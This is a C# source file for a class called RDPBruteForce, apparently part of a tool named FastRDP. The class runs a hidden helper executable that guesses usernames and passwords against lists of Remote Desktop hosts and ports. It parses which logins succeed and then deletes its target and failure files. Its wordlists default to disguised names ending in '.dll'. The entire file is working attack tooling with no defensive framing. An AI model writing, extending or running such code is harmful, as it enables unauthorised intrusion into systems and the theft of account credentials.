using System;
using System.Collections.Generic;
using System.Diagnostics;
using System.Linq;
using System.Runtime.CompilerServices;
using System.Text;
using System.Threading.Tasks;

namespace FastRDP.Models
{
    public static class RDPBruteForce
    {
        private static string rdpBruteFileName = "helper.exe";
        private static string usersFilePath = "u.dll";
        private static string passwordsFilePath = "p.dll";
        private static string hostnamesFilePath = "targets.txt";
        private static string[] usernames;
        private static string[] passwords;
        private static string[] hostnames;
        private static int connectionTimeout;
        private static int threadsCount;
        private static Process helperProcess;
        private static bool isReadyToStart = false;
        private static Queue<string> resultQueue = new Queue<string>();
        private static bool isHelperProcessDone = false;
    


        private static bool startProcess()
        {
            ProcessStartInfo startInfo = new ProcessStartInfo();
            startInfo.FileName = rdpBruteFileName;
            startInfo.CreateNoWindow = true;
            startInfo.UseShellExecute = false;
            startInfo.WindowStyle = ProcessWindowStyle.Normal;
            startInfo.Arguments = string.Format("-hosts {0} -users {1} -pass {2} -workers {3}",
                hostnamesFilePath, usersFilePath, passwordsFilePath, threadsCount.ToString());
            startInfo.RedirectStandardOutput = true;
            startInfo.RedirectStandardError = true;

            try
            {
                helperProcess = Process.Start(startInfo);
                string line = "";
                while (!helperProcess.StandardOutput.EndOfStream)
                {
                    line = helperProcess.StandardOutput.ReadLine();
                    resultQueue.Enqueue(line);
                }
                helperProcess.WaitForExit();
                return true;
            }catch(Exception ex)
            {
                MessageBox.Show(ex.Message.ToString(), "Error", MessageBoxButtons.OK, MessageBoxIcon.Error);
                return false;
            }
        }
        public static bool start()
        {
            if (isReadyToStart) { return startProcess(); }
            return false;
        } 
        public static bool stop()
        {
            try
            {
                helperProcess.Kill(true);
                return true;
            }catch(Exception ex)
            {
                MessageBox.Show(ex.Message.ToString(), "Error", MessageBoxButtons.OK, MessageBoxIcon.Error);
                return false;
            }
        }
        private static string[] mergeHostsAndPorts(string[] hosts, string[] ports)
        {
            List<string> result = new List<string>();
            for(int i = 0; i < hosts.Length; i++)
            {
                for(int j = 0; j < ports.Length; j++)
                {
                    result.Add(string.Format("{0}:{1}", hosts[i], ports[j]));
                }
            }
            return result.ToArray();
        }
        public static void parseArguments(string usersPath, string passwordsPath, string[] hosts, string[] ports, int timeout, int threads)
        {
            usersFilePath = usersPath;
            passwordsFilePath = passwordsPath;

           
            hostnames = mergeHostsAndPorts(hosts, ports);
            if(Utils.FileUtils.writeLinesToFile(hostnames, hostnamesFilePath))
            {
                connectionTimeout = timeout;
                threadsCount = threads;
                isReadyToStart = true;
            }
            else
            {
                MessageBox.Show("Something is wrong! Please try again.","Error", MessageBoxButtons.OK, MessageBoxIcon.Error);
            }
        }

        public static bool allResultGetted()
        {
            return isHelperProcessDone;
        }

        public static RDPResult? getResult()
        {
            
            if (isHelperProcessDone)
            {
                try
                {
                    File.Delete(hostnamesFilePath);
                    File.Delete("failed.txt");
                }
                catch
                {

                }
                return null;
            }
            try
            {
                string result = resultQueue.Dequeue();
                if(result == "done")
                {
                    isHelperProcessDone = true;
                    return null;
                }
                string[] splitBySpace = result.Split(' ');
                if (splitBySpace.Length < 6) { return null; }
                string user = splitBySpace[0].Split(':')[1];
                string pass = splitBySpace[1].Split(':')[1];
                string host = splitBySpace[2].Split(':')[1];
                string domain = splitBySpace[3].Split(':')[1];
                string port = splitBySpace[4].Split(':')[1];
                bool status = splitBySpace[5].Split(':')[1] == "true" ? true : false;
                string errorStr = "";
                if (!status)
                {
                    for (int i = 6; i < splitBySpace.Length; i++)
                    {
                        errorStr += splitBySpace[i] + " ";
                    }
                    errorStr = errorStr.Split("ErrorString:")[1];

                    if (errorStr.Contains("remote error: tls: access denied"))
                    {
                        errorStr = "Wrong user/password";
                    }
                }

                RDPResult rdpResult = new RDPResult(domain + "\\" + user, pass, host, port, status, errorStr);
                return rdpResult;
            }
            catch
            {
                return null;
            }
        }
    }
}
